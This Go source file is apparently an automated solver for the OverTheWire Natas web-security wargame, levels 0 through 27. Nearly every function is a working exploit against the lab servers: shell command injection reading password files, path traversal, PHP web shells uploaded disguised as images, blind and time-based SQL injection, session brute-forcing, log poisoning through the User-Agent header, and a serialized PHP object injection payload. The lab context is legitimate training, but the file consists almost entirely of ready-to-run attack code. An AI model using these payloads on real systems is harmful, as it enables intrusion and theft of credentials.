package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

var Solutions []func(string, string) string

func Init() {

	//Natas0
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas0.natas.labs.overthewire.org/", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas1
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas1.natas.labs.overthewire.org/", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas2
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas2.natas.labs.overthewire.org/files/users.txt", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas3
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas4
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas4.natas.labs.overthewire.org/", nil)
		req.Header["Referer"] = []string{"http://natas5.natas.labs.overthewire.org/"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas5
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas5.natas.labs.overthewire.org/", nil)
		req.AddCookie(&http.Cookie{Name: "loggedin", Value: "1"})
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas6
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("POST", "http://natas6.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("secret=FOEIUWGHFEEUHOFUOIU&submit=Submit")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas7
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas8
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("POST", "http://natas8.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("secret=oubWYf2kBq&submit=Submit")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas9
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("POST", "http://natas9.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("needle=; cat /etc/natas_webpass/natas10; #&submit=Search")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas10
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas10.natas.labs.overthewire.org/?needle=%24%28cat%20%2Fetc%2Fnatas_webpass%2Fnatas11%29%20%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas11
	Solutions = append(Solutions, func(username string, password string) string {
		req1, _ := http.NewRequest("GET", "http://natas11.natas.labs.overthewire.org/", nil)
		req1.SetBasicAuth(username, password)
		resp1, err1 := http.DefaultClient.Do(req1)
		if err1 != nil {
			panic("Could not get natas 11")
		}

		dataValue := resp1.Cookies()[0].Value

		decodedData, err := base64.StdEncoding.DecodeString(dataValue)
		selectedBytes := decodedData[33:37]
		xorKey := []byte{}
		for _, b := range selectedBytes {
			xorKey = append(xorKey, b^0x66)
		}

		xorKey[0], xorKey[1], xorKey[2], xorKey[3] = xorKey[3], xorKey[0], xorKey[1], xorKey[2]

		cookieData := []byte(`{"showpassword":"yes","bgcolor":"#ffffff"}`)
		encryptedData := []byte{}
		for i, b := range cookieData {
			encryptedData = append(encryptedData, b^xorKey[i%len(xorKey)])
		}
		req, _ := http.NewRequest("GET", "http://natas11.natas.labs.overthewire.org/", nil)
		req.AddCookie(&http.Cookie{Name: "data", Value: base64.StdEncoding.EncodeToString(encryptedData)})
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas12
	Solutions = append(Solutions, func(username string, password string) string {
		fileRegex, _ := regexp.Compile(`upload\/[^\.]+\.php`)
		req, _ := http.NewRequest("POST", "http://natas12.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n1000\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\ncode.php\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo shell_exec(\"cat /etc/natas_webpass/natas13\"); ?>\n\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz--\r\n")))
		req.Header["Content-Type"] = []string{"multipart/form-data; boundary=----WebKitFormBoundaryuXuSkExEPOTrNaMz"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			files := fileRegex.FindAllString(string(body), -1)
			req, _ := http.NewRequest("GET", "http://natas12.natas.labs.overthewire.org/"+files[len(files)-1], nil)
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				newPass := findPassword(string(body))
				return newPass
			}
		}
		return ""
	})

	//Natas13
	Solutions = append(Solutions, func(username string, password string) string {
		fileRegex, _ := regexp.Compile(`upload\/[^\.]+\.php`)
		req, _ := http.NewRequest("POST", "http://natas13.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n1000\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\ncode.php\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"test.gif\"\r\nContent-Type: image/gif\r\n\r\nGIF89a\r\n<?php echo shell_exec(\"cat /etc/natas_webpass/natas14\"); ?>\n\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz--\r\n")))
		req.Header["Content-Type"] = []string{"multipart/form-data; boundary=----WebKitFormBoundaryuXuSkExEPOTrNaMz"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			files := fileRegex.FindAllString(string(body), -1)
			req, _ := http.NewRequest("GET", "http://natas13.natas.labs.overthewire.org/"+files[len(files)-1], nil)
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				newPass := findPassword(string(body))
				return newPass
			}
		}
		return ""
	})

	//Natas14
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("POST", "http://natas14.natas.labs.overthewire.org/", bytes.NewBuffer([]byte(`username=natas15" #&password=""`)))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas15
	Solutions = append(Solutions, func(username string, password string) string {
		allLetters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
		letters := struct {
			data string
			mux  sync.Mutex
		}{}
		newPass := struct {
			data string
			mux  sync.Mutex
		}{}
		wg := sync.WaitGroup{}
		wg.Add(len(allLetters))

		testLetter := func(letter string, wg *sync.WaitGroup) {
			req, _ := http.NewRequest("POST", "http://natas15.natas.labs.overthewire.org/", bytes.NewBuffer([]byte(`username=natas16" and password LIKE BINARY "%`+letter+`%" #"`)))
			req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				if strings.Contains(string(body), "exists") {
					letters.mux.Lock()
					letters.data = letters.data + letter
					letters.mux.Unlock()
				}
			}
			wg.Done()
		}
		testPassword := func(newPW string, letter string, wg *sync.WaitGroup) {
			req, _ := http.NewRequest("POST", "http://natas15.natas.labs.overthewire.org/", bytes.NewBuffer([]byte(`username=natas16" and password LIKE BINARY "`+newPW+letter+`%" #"`)))
			req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				if strings.Contains(string(body), "exists") {
					newPass.mux.Lock()
					newPass.data = newPass.data + letter
					newPass.mux.Unlock()
				}
			}
			wg.Done()
		}

		for _, v := range allLetters {
			go testLetter(string(v), &wg)
		}
		wg.Wait()
		for i := 0; i < 32; i++ {
			wg.Add(len(letters.data))
			for _, v := range letters.data {
				go testPassword(newPass.data, string(v), &wg)
			}
			wg.Wait()
			fmt.Print(string(newPass.data[len(newPass.data)-1]))
		}
		return newPass.data
	})

	//Natas16
	Solutions = append(Solutions, func(username string, password string) string {
		allLetters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
		letters := struct {
			data string
			mux  sync.Mutex
		}{}
		newPass := struct {
			data string
			mux  sync.Mutex
		}{}
		wg := sync.WaitGroup{}

		testLetter := func(letter string, wg *sync.WaitGroup) {
			req, _ := http.NewRequest("GET", "http://natas16.natas.labs.overthewire.org/?needle="+url.PathEscape("August$(grep "+letter+" /etc/natas_webpass/natas17)")+"&submit=Search", nil)
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				if !strings.Contains(string(body), "August") {
					letters.mux.Lock()
					letters.data = letters.data + letter
					letters.mux.Unlock()
				}
			}
			wg.Done()
		}
		testPassword := func(newPW string, letter string, wg *sync.WaitGroup) {
			req, _ := http.NewRequest("GET", "http://natas16.natas.labs.overthewire.org/?needle="+url.PathEscape("August$(grep ^"+newPW+letter+" /etc/natas_webpass/natas17)")+"&submit=Search", nil)
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				if !strings.Contains(string(body), "August") {
					newPass.mux.Lock()
					newPass.data = newPass.data + letter
					newPass.mux.Unlock()
				}
			}
			wg.Done()
		}

		wg.Add(len(allLetters))
		for _, v := range allLetters {
			go testLetter(string(v), &wg)
		}
		wg.Wait()

		for i := 0; i < 32; i++ {
			wg.Add(len(letters.data))
			for _, v := range letters.data {
				go testPassword(newPass.data, string(v), &wg)
			}
			wg.Wait()
			fmt.Print(string(newPass.data[len(newPass.data)-1]))

		}
		return newPass.data
	})

	//Natas17
	Solutions = append(Solutions, func(username string, password string) string {
		allLetters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
		letters := ""
		newPass := ""

		for _, v := range allLetters {
			letter := string(v)
			req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "%`+letter+`%" AND SLEEP(0.2); #"`)))
			req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
			req.SetBasicAuth(username, password)
			start := time.Now()
			resp, err := http.DefaultClient.Do(req)
			passed := time.Since(start)
			if err == nil && resp.StatusCode == 200 {
				if passed > time.Millisecond*400 {
					letters = letters + letter
				}
			}
			//fmt.Println(passed)
		}
		for i := 0; i < 32; i++ {
			for _, v := range letters {
				letter := string(v)
				req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "`+newPass+letter+`%" AND SLEEP(0.2); #"`)))
				req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
				req.SetBasicAuth(username, password)
				start := time.Now()
				_, err := http.DefaultClient.Do(req)
				passed := time.Since(start)
				if err == nil {
					if passed > time.Millisecond*400 {
						newPass = newPass + letter
						fmt.Print(letter)
						break
					}
				}
			}
		}
		return newPass
	})

	//Natas18
	Solutions = append(Solutions, func(username string, password string) string {
		returChan := make(chan string)

		doTest := func(i int, returnChan chan string) {
			req, _ := http.NewRequest("GET", "http://natas18.natas.labs.overthewire.org/", nil)
			req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: strconv.Itoa(i)})
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				if len(body) > 1000 {
					newPass := findPassword(string(body))
					returnChan <- newPass
				}
			}
		}

		for i := 1; i < 641; i++ {
			go doTest(i, returChan)
		}
		return <-returChan
	})

	//Natas19
	Solutions = append(Solutions, func(username string, password string) string {

		returChan := make(chan string)

		doTest := func(i int, returnChan chan string) {
			req, _ := http.NewRequest("GET", "http://natas19.natas.labs.overthewire.org/", nil)
			req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: hex.EncodeToString([]byte(strconv.Itoa(i) + "-admin"))})
			req.SetBasicAuth(username, password)
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				if len(body) > 1050 {
					newPass := findPassword(string(body))
					returnChan <- newPass
				}
			}
		}

		for i := 1; i < 641; i++ {
			go doTest(i, returChan)
		}
		return <-returChan
	})

	//Natas20
	Solutions = append(Solutions, func(username string, password string) string {
		cookieJar, _ := cookiejar.New(nil)
		client := &http.Client{Jar: cookieJar}
		req, _ := http.NewRequest("POST", "http://natas20.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte("name=test\nadmin 1")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		client.Do(req)
		req, _ = http.NewRequest("GET", "http://natas20.natas.labs.overthewire.org/index.php", nil)
		req.SetBasicAuth(username, password)
		resp, err := client.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas21
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("POST", "http://natas21-experimenter.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte("align=left&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		session := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], "; ")[0], "=")[1]
		if err == nil {
			req, _ := http.NewRequest("GET", "http://natas21.natas.labs.overthewire.org/index.php", nil)
			req.SetBasicAuth(username, password)
			req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: session})
			resp, err := http.DefaultClient.Do(req)
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				newPass := findPassword(string(body))
				return newPass
			}
		}
		return ""
	})

	//Natas22
	Solutions = append(Solutions, func(username string, password string) string {
		client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
		req, _ := http.NewRequest("GET", "http://natas22.natas.labs.overthewire.org/index.php?revelio=", nil)
		req.SetBasicAuth(username, password)
		resp, _ := client.Do(req)
		body, _ := ioutil.ReadAll(resp.Body)
		newPass := findPassword(string(body))
		return newPass
	})

	//Natas23
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas24
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas24.natas.labs.overthewire.org/?passwd[]=0", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas25
	Solutions = append(Solutions, func(username string, password string) string {
		cookieJar, _ := cookiejar.New(nil)
		client := &http.Client{Jar: cookieJar}
		req, _ := http.NewRequest("GET", "http://natas25.natas.labs.overthewire.org/?lang=en", nil)
		req.SetBasicAuth(username, password)
		resp, err := client.Do(req)
		session := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], "; ")[0], "=")[1]
		req.Header["User-Agent"] = []string{"<?php echo shell_exec('cat /etc/natas_webpass/natas26'); ?>"}
		req.URL, _ = url.Parse("http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_" + session + ".log")
		resp, err = client.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas26
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/", nil)
		req.SetBasicAuth(username, password)
		req.AddCookie(&http.Cookie{Name: "drawing", Value: "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MDoiaW1nLzJlNDQzM2YxMmI4M2IyM2ZmNTAzOGFlYjc2NDYwMWU1LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTA6Ijw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9"})
		http.DefaultClient.Do(req)
		req, _ = http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/img/2e4433f12b83b23ff5038aeb764601e5.php", nil)
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})

	//Natas27
	Solutions = append(Solutions, func(username string, password string) string {
		req, _ := http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("username=natas28                                                         .&password=testing")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		http.DefaultClient.Do(req)
		req, _ = http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("username=natas28                                                         &password=testing")))
		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
		req.SetBasicAuth(username, password)
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			newPass := findPassword(string(body))
			return newPass
		}
		return ""
	})
}

func findPassword(searchText string) string {
	passwordRegex, _ := regexp.Compile(`[a-zA-Z0-9]{32}`)
	candidates := passwordRegex.FindAllString(searchText, -1)
	return candidates[len(candidates)-1]
}
